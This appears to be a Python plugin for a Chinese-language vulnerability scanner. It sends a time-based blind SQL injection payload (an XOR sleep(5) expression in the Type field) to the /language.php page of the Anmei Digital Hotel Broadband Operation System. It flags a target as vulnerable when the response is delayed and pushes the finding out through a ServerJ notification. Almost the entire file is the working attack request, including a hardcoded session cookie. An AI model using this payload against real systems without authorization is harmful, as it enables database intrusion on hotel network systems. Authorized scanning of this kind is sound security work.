import time

from Common.Common_Request import common_request
from Modules.Configure import ServerJ


class Basic_information:
    no = 95,
    bugName = '安美数字酒店宽带运营系统SQL注入漏洞'


def scan_Anmei_DigitalHotel_BroadbandOperation_System_SQL_injection(url, proxies, append_to_output, serverJ_key,
                                                                    bugName):
    path = "/language.php"
    data = '''EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF&Lately=555-666-0606&Search=the&SerialID=1&Type=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&UID=add&submit=%20%E6%B7%BB%20%E5%8A%A0%20'''

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Cookie": "PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4;",
        "dashboroad": "srgua4gv7d2jnichvtl66l1146",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip,deflate,br",
        "User-Agent": "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
        "Connection": "Keep-alive",
    }

    expected_time = 5
    start_time = time.time()
    response = common_request(url, path, headers, data=data, method='POST', timeout=5, proxies=proxies,
                              append_to_output=append_to_output)
    end_time = time.time()
    response_time = end_time - start_time
    if response_time >= expected_time:
        append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
        ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
    else:
        append_to_output(f"[-] {url} 不存在{bugName}", "green")
